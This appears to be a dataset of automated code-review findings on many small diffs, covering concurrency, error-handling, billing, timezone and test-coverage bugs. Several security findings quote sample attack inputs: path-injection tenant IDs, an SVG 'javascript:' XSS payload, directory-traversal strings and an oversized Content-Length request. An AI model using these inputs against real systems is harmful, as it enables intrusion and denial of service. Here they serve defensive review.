findings.body: The new logic raising CouponExpired when coupon.expires_at is in the past is untested. The only test in tests/test_coupons.py was updated to pass a future expires_at, which avoids the new branch entirely. If the comparison were inverted, or the exception were never raised, or the wrong exception type were used, no test would fail.

findings.title: Comparison assumes expires_at is non-None and timezone-aware
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` raises `TypeError` in two reachable cases: (a) `expires_at is None` for a coupon with no expiry — `'<' not supported between instances of 'NoneType' and 'datetime.datetime'`; (b) `expires_at` is a naive datetime (e.g. loaded from a DB column without timezone) — `can't compare offset-naive and offset-aware datetimes`. Both surface as a crash rather than the intended `CouponExpired`. Guard with `if coupon.expires_at is not None and ...` and normalise naive values to UTC before comparing.

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but contains no `await`; it calls the synchronous `requests.get` with `timeout=5`. Because this runs on the event loop thread, every other coroutine — including unrelated in-flight requests — is frozen for the full duration of the HTTP call, up to 5 seconds if `billing.internal` is slow. The `async def` makes this invisible to callers, who reasonably assume awaiting it yields control.

Use the existing async client pattern already established in this module (see `fetch_plan` on lines 5-7), e.g. `async with httpx.AsyncClient() as client: response = await client.get(...)`, or pass in an `httpx.AsyncClient` the same way `fetch_plan` does. If the sync call must stay, wrap it in `anyio.to_thread.run_sync`/`loop.run_in_executor`.

findings.title: tenant_id interpolated unencoded into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `https://billing.internal/limits/{tenant_id}`. If `tenant_id` originates from a request parameter (path segment, query string, JSON body) it can contain `/`, `..`, `?` or `#`, which lets a caller reshape the path and reach other endpoints on the internal `billing.internal` host \u2014 for example `tenant_id="../admin/keys"` or `tenant_id="123?admin=true"`. This is an unauthenticated-from-the-internet-facing-edge pivot into an internal service, which is exactly the class of target SSRF/path-injection aims at.

Fix by validating the identifier before use (e.g. assert it matches `^[0-9a-fA-F-]+$` or that it is an int) and/or passing it through `urllib.parse.quote(str(tenant_id), safe="")` so separators cannot escape the intended path segment. Passing query parameters via `params=` rather than string interpolation also helps.

findings.title: No test covers fetch_plan_limits' blocking call behavior
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests` library instead of an async HTTP client, which would block the event loop in production. There is no test in this diff (or apparently in the repo, since fetch_plan itself has no visible test) that would catch this. If someone were to fix this to use httpx.AsyncClient consistently, nothing would fail to alert that the blocking call was ever a problem, nor would anything catch a regression back to a blocking call in the future.

findings.title: Bare `except` swallows KeyboardInterrupt/SystemExit and hides all failures
findings.body:
`except:` with no exception class catches `BaseException`, so it also intercepts `KeyboardInterrupt`, `SystemExit` and `GeneratorExit`. If a shutdown signal or Ctrl-C arrives while `_client.send` is in flight, this function will absorb it and return `None`, making the process appear to continue normally — the opposite of the intent, which is only to make *push failures* non-fatal.

Narrow it to `except Exception:` and log the failure (e.g. `logger.warning("metrics push failed", exc_info=True)`) so that a persistently broken metrics endpoint is diagnosable rather than invisible. As written, every failure mode — bad payload, auth expiry, endpoint down, a `NameError` in `_client.send` — is indistinguishable from success.

findings.title: No test covers the new exception-swallowing behavior
findings.body: The change alters push_metrics so that any exception raised by _client.send is now caught and suppressed, returning None instead of propagating. There is no test in this diff verifying that: (1) a failing send no longer raises, (2) the function returns None on failure, and (3) a successful send still returns the client's result. Without such a test, a future refactor could reintroduce the fatal behavior, or subtly break the fallback path, and nothing would fail.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, then hits an `await` at line 18 before writing at line 19. The `await` is a scheduling point, so any number of other `try_consume` coroutines for the same tenant can run between the read and the write: each sees the same stale `current`, each passes the `current + cost > LIMIT` check, and each writes `current + cost`. The result is that N concurrent callers can all be admitted when only one should be, and the final counter reflects a single increment instead of N (lost update).

It also does not acquire `_lock`, which `consume` (lines 9-11) uses to guard exactly this dictionary. Any `consume()` increment that lands between line 15 and line 19 is silently overwritten by the absolute assignment `_counters[tenant] = current + cost`.

Fix: wrap the whole read-check-write sequence in `async with _lock:` (and do not `await` anything other than the lock acquisition inside the critical section), e.g.

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act with await in between

findings.title: Public API contract unclear: try_consume lacks thread-safety promise
findings.body: The `try_consume` function is a public async function with no docstring explaining its atomicity guarantees. A caller would reasonably expect it to provide the same thread-safe semantics as `consume` (which holds `_lock`), but it does not — there is a race window between the check on line 16 and the write on line 19. This gap is subtle enough that callers acting on an assumption of safety could trigger overages. Callers need explicit documentation of whether this function checks-then-acts atomically or not.

findings.title: try_consume race condition has no concurrent test coverage
findings.body: try_consume reads _counters without holding _lock, then awaits (asyncio.sleep(0)) before writing back, unlike consume which is fully guarded by the lock. This reintroduces the classic check-then-act race: two concurrent calls for the same tenant can both read the same 'current' value, both pass the limit check, and both write, allowing the tenant to exceed LIMIT. No test in this diff exercises concurrent calls to try_consume, so this race would not be caught by any existing or added test.

findings.title: Return shape change breaks existing tuple-unpacking caller
findings.body: `lookup_user` now returns a three-key dict instead of the `(name, email)` tuple it previously returned. The retrieved caller `reports/weekly.py:render_row` does `name, email = lookup_user(user_id)`, which will now raise `ValueError: too many values to unpack (expected 2)` (and even for a two-key dict it would bind the *keys*, not the values, producing silently wrong output). Either keep returning a tuple, return a `NamedTuple`/dataclass that still unpacks as `(name, email)`, or update every caller — including `reports/weekly.py:6` — in the same change.

findings.title: Docstring describes wrong return type and shape
findings.body:
The docstring states the function returns `(name, email)` as a tuple, but the function now returns a dictionary with keys `name`, `email`, and `tier`. This will cause callers reading the documentation to use the function incorrectly, attempting tuple unpacking when they should access dictionary keys. The repository context shows existing callers (reports/weekly.py) unpack the return value as `name, email = lookup_user(user_id)`, which will break with the new return type.

_Also raised by the correctness agent:_ Docstring still documents the old tuple return contract

findings.title: No test catches lookup_user's tuple→dict contract break
findings.body: lookup_user now returns a dict instead of a (name, email) tuple. The existing caller reports/weekly.py:render_row does `name, email = lookup_user(user_id)`, which will now unpack the dict's keys instead of values (or raise, depending on dict size), silently or loudly breaking. No test in this change exercises render_row or lookup_user's return shape, so this regression would not be caught by any existing suite.

findings.title: WriteSettlement always returns nil, hiding insert failures
findings.body:
The error from `db.Exec` is bound to an `err` scoped to the `if` statement on line 15; it is only logged and never propagated. Lines 18-19 then declare a fresh `var err error` (always nil) and return it, so `WriteSettlement` returns `nil` on every path after validation — including when the settlement INSERT fails. Any caller that checks `if err := WriteSettlement(...); err != nil` will conclude the settlement was persisted when it was not, which means silent loss of financial records (and, in a transaction/retry wrapper, a commit over a missing row).

Fix by returning the error directly, mirroring `WriteEntry` above:

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

_Also raised by the security agent:_ WriteSettlement always returns nil — failed inserts reported as success

findings.title: No test would catch WriteSettlement always returning nil
findings.body: WriteSettlement discards the actual db.Exec error (only logs it) and returns a separately declared `var err error` which is always nil (lines 18-19). This means the function reports success even when the insert fails. There is no test in this diff exercising WriteSettlement with a failing Exec (e.g. via a mock/stub DB) that asserts the returned error is non-nil. Since the sibling function above it returns err directly and presumably has or would have such a test, this new function's regression in behavior would pass unnoticed.

findings.title: Mutable default argument accumulates failures across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that does not pass `attempted` explicitly shares the same list object. Line 10 appends to that shared list and line 11 returns it, so the second call returns the failures from the first call plus its own, the third returns all three, and so on. Callers that treat the return value as "recipients that failed in this batch" will see stale entries, and the list grows without bound for the lifetime of the process.

Fix with the standard sentinel, matching the defensive copy already used on line 2 of this same module:

    def send_with_retries(recipients, attempted=None):
        attempted = list(attempted) if attempted else []

Separately, note the function is named `send_with_retries` but the loop on lines 8-10 dispatches each recipient exactly once with no retry — either the name or the body is wrong.

_Also raised by the security agent:_ Shared mutable default accumulates recipients across calls unboundedly

_Also raised by the docs agent:_ Public function with mutable default argument lacks documentation

findings.title: No test exercises send_with_retries or its mutable default bug
findings.body: send_with_retries uses a mutable default argument `attempted=[]`, which will persist and accumulate across calls when the caller relies on the default. No test file is included in this diff, so nothing would catch this bug (e.g. calling the function twice and observing that the second call's returned list unexpectedly contains entries from the first call), nor would anything verify the basic retry behavior (that failed dispatches are collected and returned).

findings.title: Rounding boundary changed from >= 0.5 to > 0.5 inside a rename PR
findings.body: `calc_rounding` returned `1 if line.remainder_cents >= 0.5 else 0`; the renamed `compute_rounding` returns `1 if line.remainder_cents > 0.5 else 0`. Every other function in this diff is an unmodified body with only the name changed, so this is the one behavioural change and it is not mentioned anywhere. A remainder of exactly 0.5 cents now rounds down instead of up — that is standard half-up rounding being turned into something else, and on money it will show up as off-by-one-cent discrepancies against previously issued invoices and against any reconciliation fixtures. If the change is intentional it needs its own PR, a test at the 0.5 boundary, and a note about restating existing totals; if it is not, restore `>=`.

findings.title: Boundary change in compute_rounding untested and unnoted
findings.body: The rename from calc_rounding to compute_rounding was accompanied by a silent logic change: the comparison operator changed from `>=` to `>`. This changes the result for line.remainder_cents == 0.5 (previously rounds up, now does not). No test file is included in this diff, so nothing would catch this regression if it is unintended — a caller relying on the old boundary behavior would silently get a different rounding result at exactly 0.5.

findings.title: Off-by-one slice in page_of_sorted drops one record per page
findings.body:
`page_of_sorted` slices `ordered[start : start + PAGE_SIZE - 1]`, returning at most `PAGE_SIZE - 1` records, while `start` still advances by a full `PAGE_SIZE` per page (line 11). The record at index `start + PAGE_SIZE - 1` is therefore never returned by any page: it is excluded from page N by the short slice and skipped by page N+1, whose start is `(page+1) * PAGE_SIZE`. Any consumer paginating an export through this function will silently lose one record out of every PAGE_SIZE. The existing `page_of` on line 6 uses `records[start : start + PAGE_SIZE]`, which is the correct form; line 12 should match it.

_Also raised by the docs agent:_ page_of_sorted returns wrong page size

findings.title: New paginated-sort function lacks tests and has an off-by-one slice
findings.body: page_of_sorted slices ordered[start : start + PAGE_SIZE - 1], which returns one fewer element than PAGE_SIZE per page (dropping the last record of each page), unlike page_of which correctly slices to start + PAGE_SIZE. No test exercises this function, so nothing would catch a caller receiving a truncated page or missing records across page boundaries.

findings.title: Removed None guard crashes on invoices without a purchase order
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as set for only ~1 in 20 accounts. The rewrite calls `invoice.purchase_order.upper()` unconditionally, so `header_lines` will raise `AttributeError: 'NoneType' object has no attribute 'upper'` for the ~95% of invoices with no PO. Restore the conditional append (or build the PO line only when `purchase_order is not None`) while keeping the list-literal style for the first line.

_Also raised by the docs agent:_ Removed null guard without documentation update

findings.title: Removed null guard on purchase_order has no test covering the null case
findings.body: The previous code guarded `invoice.purchase_order.upper()` with an `is not None` check; that guard is now gone, so any invoice with `purchase_order = None` (per the model docstring, roughly 19 of 20 customers) will raise AttributeError. No test in this diff exercises `header_lines` with a None purchase_order, so this regression would not be caught by any test suite run.

findings.title: File handle leaks on early return and exception paths
findings.body:
`fh = open(path)` is only closed on the single happy path at line 16. If the header does not match, line 14 returns `None` with the handle still open; likewise any exception from `next(reader)` (line 12) or `list(reader)` (line 15) escapes without closing. Under CPython this is masked by refcounting, but it is nondeterministic on other runtimes and will exhaust descriptors under a loop of mismatched files. Use `with open(path) as fh:` around the whole body, exactly as `read_rows` does on line 5.

_Also raised by the security agent:_ Leaked file handle on header-mismatch path can exhaust descriptors

findings.title: read_validated has no tests; leaked fd on mismatch path uncaught
findings.body: The new function read_validated opens a file handle and only closes it on the success path (line 16). If header != expected_header, it returns None at line 14 without closing fh, leaking the file descriptor. No test exercises either the matching-header or mismatched-header behavior, so this leak (and any future regression in the validation logic) would not be caught.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`billing.gateway.charge` is explicitly documented as NOT idempotent: "each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any transient failure that occurs *after* the gateway accepted the POST (timeout on the response, connection reset, 5xx emitted post-commit) will be retried and create a second (or third) charge against the customer's card. Note the contrast with `fetch_charge` above, which retries `get_charge`, a call the docstring marks "Safe to repeat" — the retry is correct there and not here.

The gateway already provides the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (outside the retried call, so all attempts share it) and thread it through `charge(...)` so the gateway collapses retries into a single charge. If `charge()` cannot yet accept a key, this decorator should be removed until it can.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: Retrying non-idempotent API without documented safety mechanism
findings.body: The new `charge_card()` function at line 11–12 wraps `billing.gateway.charge()` with `@retry(attempts=3)`. However, the docstring of `charge()` explicitly states it is "NOT idempotent: each call creates a new charge" and requires an Idempotency-Key header for safe retries. By retrying `charge()` without that header, `charge_card()` violates the contract of its dependency. A caller could use this function believing retries are safe, but each retry creates a new charge. Either: (1) add a docstring to `charge_card()` explaining that an Idempotency-Key must be passed and documented in how the gateway call is made, (2) ensure an Idempotency-Key is being set inside `charge_card()` (not visible in this diff), or (3) remove the retry decorator since the underlying call cannot be safely retried without additional context.

findings.title: New retry-wrapped charge_card has no test guarding against duplicate charges
findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent (each call creates a new charge) unless an Idempotency-Key is passed. Retrying it on transient failures (e.g. timeout after the charge succeeded server-side) can create duplicate charges. There is no test in this diff exercising retry behavior for charge_card, so a regression where retries double-charge would go undetected — nothing currently fails if this is wrong.

findings.title: expires_within subtracts naive now() from tz-aware expires_at
findings.body: `cutoff` is built from `datetime.now()` with no tzinfo, while `Invite.expires_at` is documented as always timezone-aware UTC (set from `datetime.now(timezone.utc)`). Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so line 10 fails on every call — the function can never return. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. Note that even if the subtraction succeeded, a naive local-clock `now()` would be silently offset from UTC by the host's timezone, so simply catching the error is not a fix.

findings.title: Timezone mismatch in expires_within contradicts Invite contract
findings.body: The `expires_within` function creates a timezone-naive cutoff using `datetime.now()` at line 9, then subtracts it from `invite.expires_at`, which is documented in the Invite class as always being timezone-aware UTC. This comparison will raise a TypeError at runtime. Either the function should use `datetime.now(timezone.utc)` to honor the documented contract, or the contract documentation for the Invite class is now inaccurate. Given that `is_expired` (line 5) correctly uses `datetime.now(timezone.utc)`, the bug is in `expires_within`, not the contract.

findings.title: No test would catch naive/aware datetime subtraction bug
findings.body: expires_within() computes datetime.now() (naive) and subtracts it from invite.expires_at, which per the model docstring is always tz-aware. Subtracting a naive datetime from an aware one raises TypeError in Python. There is no test in this diff exercising expires_within, so this defect would ship silently and only surface at runtime when the function is called.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding". `contactEmail` reads `.email` off it directly, so for any pre-onboarding account this throws `TypeError: Cannot read properties of undefined (reading 'email')` at runtime. The sibling function on line 4 handles exactly this case with `?.` plus a fallback. Mirror that: e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or, if callers genuinely require an address, change the return type to `string | undefined` and let them handle absence, rather than promising a `string` the function cannot always produce.

_Also raised by the docs agent:_ Public function omits that billingContact may be absent

findings.title: contactEmail crash path is untested
findings.body: contactEmail accesses account.billingContact.email without a null check, even though billingContact is optional per the Account type. There is no test in this diff exercising an account without a billingContact, so a call that throws at runtime would not be caught by any existing test suite.

findings.title: timeout parameter unit mismatch with fetch() contract
findings.body: The call to `fetch()` passes `timeout=30`, which according to the `fetch()` docstring is interpreted as milliseconds, not seconds. This gives a 30ms timeout when the generous timeout mentioned in the PR description suggests 30 seconds was intended. Either the timeout value should be multiplied by 1000 (e.g., `timeout=30000`), or the code should be documented to explain the 30ms choice if that is truly intentional.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS ("Callers wanting seconds must multiply"), and passes it straight through as `timeout_ms`. Passing `30` gives the partner API a 30 ms budget — and since the docstring says retries share the same budget, all 3 retries fall inside those 30 ms. Against an API the PR description itself calls slow, this call will effectively always time out rather than being "generous". Use `timeout=30_000` (or whatever the intended second count multiplied by 1000) and confirm the retry budget is sized for it.

findings.title: No test would catch the timeout unit mismatch in sync_partner_catalogue
findings.body: sync_partner_catalogue calls fetch(url, timeout=30) with no accompanying test. clients/http.py documents that `timeout` is in milliseconds, and the PR description says the timeout was 'set generously since their API is slow,' suggesting the author intended 30 seconds. A 30ms timeout would cause every real call to fail, but since there is no test asserting the value or units passed to fetch, this defect would ship undetected.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, columns and sort order as `invoices_tenant_created_idx`, already applied on 2025-11-02 by migration 0007. `IF NOT EXISTS` matches on index *name*, not on definition, so it will not suppress this: Postgres will happily build a second, fully redundant index. The cost is a duplicated build on a large table plus permanent write amplification and storage on every invoice insert/update, with no query benefit — the planner already has this exact index. Drop this statement; if the intent was a different shape (e.g. a partial index on recent rows, or including `status`), the definition needs to actually differ.

findings.title: Referer header now logged unscrubbed, leaking auth tokens into logs
findings.body:
The removed branch passed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging it; the replacement copies `request.headers[header]` verbatim for every header including `Referer`. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that token back in the Referer header on every subresource request. On any 5xx this logging path writes a live auth token into the server log, where anyone with log read access (or a log shipper/aggregator) can replay it to impersonate the user. Restore the `_scrub_uri` call for `Referer` (and keep scrubbing any other URI-bearing header) rather than logging the raw value. Note also that `extra_param_keys` is now unused in this function, which is a signal that the sanitisation was dropped rather than moved.

_Also raised by the security agent:_ Removing Referer scrubbing writes auth tokens into the logs

findings.title: No test guards against unscrubbed Referer token leaking into logs
findings.body: The change removes the call to _scrub_uri for the Referer header before logging, so the raw header (which per token_authenticated_url can contain the auth token as a query parameter) is now logged verbatim. No test in this diff (or referenced) asserts that Referer values are scrubbed before being written to the log, so this regression would not be caught by any existing test suite.

findings.title: Comment about Referer handling should be updated or removed
findings.body: Line 3 selects 'Referer' as one of four headers to log, but the previous behavior scrubbed this header specifically due to token exposure risk. The code now logs Referer unscrubbbed without any comment explaining the change in security posture or why this is now acceptable.

findings.title: Dropping 'xlinkhref' disables URL scheme checks on xlink:href
findings.body:
Line 6 narrows the guard to `href`/`src`, so an attribute named `xlinkhref` no longer reaches `isAnchorLinkAllowed(value)` on line 7 and instead falls through to whatever the function's default return is. Since the file header states that rendered attributes come from end-user-submitted markdown and that `validateProp` is the only barrier before the DOM, markup such as `<svg><a xlink:href="javascript:alert(1)">` will now be emitted unchecked against `unsafeLinkPrefix` (`javascript:`, `data:text/html`, `vbscript:`). `xlink:href` is script-executing in SVG exactly like `href`, so this reintroduces a stored XSS. Restore `|| attribute === 'xlinkhref'` (and consider also matching the colon-form `xlink:href`, depending on how the parser normalises attribute names before calling this).

_Also raised by the security agent:_ xlink:href no longer scheme-checked, reintroducing SVG XSS sink

findings.title: Removed xlinkhref check has no accompanying test to catch the regression
findings.body: The change removes 'xlinkhref' from the list of attributes routed through isAnchorLinkAllowed, meaning javascript:/data:/vbscript: URIs placed in an xlink:href attribute would no longer be blocked. No test file is included in this diff. If there was a prior test asserting that xlinkhref values are sanitised, it should now be failing after this change (and its absence from the diff suggests it may not exist, or was not run/updated). If no such test exists, this behaviour change is entirely uncovered — nothing in the test suite would catch a malicious xlink:href payload passing through unsanitised.

findings.title: Unvalidated project query param reaches path construction
findings.body:
`projectQueryParameter` comes straight from the request query string and, after this change, flows into the list operation with no validation at all. The file-backed DAO's `buildPath` does `filepath.Join(d.Folder, project, kind)` and its doc comment states it performs no validation of its own because "callers are required to have validated the names before this point." With `ValidateID` gone, a value such as `../../etc` or `..%2f..` traverses outside the storage root, so listing can read documents belonging to other projects or outside the data folder entirely.

Note also that the remaining check on line 4 only compares the query parameter against `parameters.Project` when a path project is present; when the path project is empty the query value is used unchecked, so the equality check is not a substitute for validation. Restore the `common.ValidateID(projectQueryParameter)` guard (returning `HandleBadRequestError`) before the value is used.

_Also raised by the security agent:_ Project query parameter reaches filesystem path with validation removed

findings.title: Removed input validation has no test coverage change
findings.body: The call to common.ValidateID on projectQueryParameter was removed, but no test file in this diff exercises the list() path with a malicious or malformed project query parameter (e.g. containing path traversal sequences like '../'). Since buildPath explicitly documents that callers must validate names before use, this change removes that guarantee silently. If a test existed asserting a 400 response for invalid project names in the query parameter, it should have failed or been updated as part of this diff — its absence suggests no such test exists, so this behavior change is unverified either way.

findings.title: Buffer pre-reserved from client-declared contentLength (remote OOM)
findings.body:
`multipart.NewRW().Reserve(contentLength)` commits memory up front based on `contentLength`, which for an S3 `UploadPart` request originates from the client's `Content-Length` header (the handler signature on line 2 takes it as a parameter, and nothing in this function validates it). Before this change the RW grew incrementally as `io.Copy` on line 8 consumed the body, so the peak allocation was bounded by the bytes the client actually sent. Now a client can send `Content-Length: 5000000000` with a trivial or slowly-dribbled body and force the allocation immediately — several concurrent such requests will OOM the process, and no upload needs to complete for the memory to be taken.

Suggested fix: clamp the reservation to a sane ceiling (e.g. `min(contentLength, maxPartSize)` or a fixed initial-capacity cap such as a few MiB) and let the RW grow from there, so the allocation is driven by bytes received rather than bytes declared. Also guard the negative/unknown case: `contentLength` is `-1` for chunked or unknown-length bodies, and it is not visible here what `Reserve` does with a negative argument.

_Also raised by the correctness agent:_ Buffer reserved from client-declared contentLength before reading body

findings.title: No test covers Reserve(contentLength) behavior or its bounds
findings.body: The change switches from an incrementally-growing RW buffer to one that pre-reserves contentLength bytes up front via Reserve(). This is exactly the kind of change (declared-length-driven allocation) that can reintroduce or fix a resource-exhaustion issue depending on whether contentLength is validated/bounded elsewhere. No test in this diff exercises Reserve with a large, mismatched, or malicious contentLength value, so a future change that removes bounds checking or misuses this call would not be caught by any existing test.

findings.title: Removed comment about buffer growth no longer applies
findings.body: The comment previously stated 'The RW grows a page at a time as the body is read.' This is no longer accurate after the code was changed to pre-reserve the buffer with `Reserve(contentLength)`. The new behavior allocates the full content length upfront rather than growing incrementally. The comment should be updated to reflect this change in behavior.

findings.title: Unknown/negative contentLength (-1) passed to Reserve unguarded
findings.body: For chunked or otherwise unsized request bodies the declared length is conventionally `-1` (and `0` for an empty declaration). `Reserve` is handed that value directly with no guard. Depending on its implementation this is either a wasted no-op or a panic on a negative capacity. Guard the call, e.g. only reserve when `contentLength > 0`.

findings.title: Default S3 scheme silently changes from https to http
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when the caller explicitly set `is_secure = False`; every other value — including the missing-key case where `.get()` returns `None` — produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats `None` (and any other falsy value) as a request for plaintext, so requests that do not set `meta["is_secure"]` at all are now sent over `http://` to `{bucket}.s3.amazonaws.com` on line 6. That downgrades every default S3 fetch — and any AWS auth headers attached to it — to an unencrypted channel, which is both a behaviour change for existing callers that never set the flag and a confidentiality loss.

If the goal was only to drop the `is False` idiom, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged) or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

_Also raised by the security agent:_ S3 handler defaults to plaintext HTTP, silently disabling TLS

findings.title: No test covers the default scheme when is_secure is unset
